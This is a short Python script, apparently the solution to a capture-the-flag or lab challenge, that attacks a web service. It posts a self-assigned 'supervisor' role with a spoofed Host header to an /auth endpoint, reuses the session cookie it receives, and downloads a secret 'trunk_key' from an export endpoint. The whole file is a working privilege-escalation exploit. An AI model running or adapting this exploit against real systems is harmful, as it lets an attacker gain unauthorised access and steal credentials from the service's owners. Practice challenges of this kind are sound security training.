#!/usr/bin/env python3
"""Usage: python3 solve.py http://assigned-host:port"""
import json
import re
import sys
import urllib.request

base = sys.argv[1].rstrip('/')
host = 'exch-ctl.vjod.internal'
body = json.dumps({'username': 'EX-01', 'role': 'supervisor'}).encode()
auth = urllib.request.Request(base + '/auth', data=body,
                              headers={'Host': host, 'Content-Type': 'application/json'})
response = urllib.request.urlopen(auth, timeout=10)
assert json.loads(response.read())['role'] == 'supervisor'
cookie = response.headers['Set-Cookie'].split(';', 1)[0]
export = urllib.request.Request(base + '/export/trunk-key',
                                headers={'Host': host, 'Cookie': cookie})
data = json.load(urllib.request.urlopen(export, timeout=10))
print(data['trunk_key'])
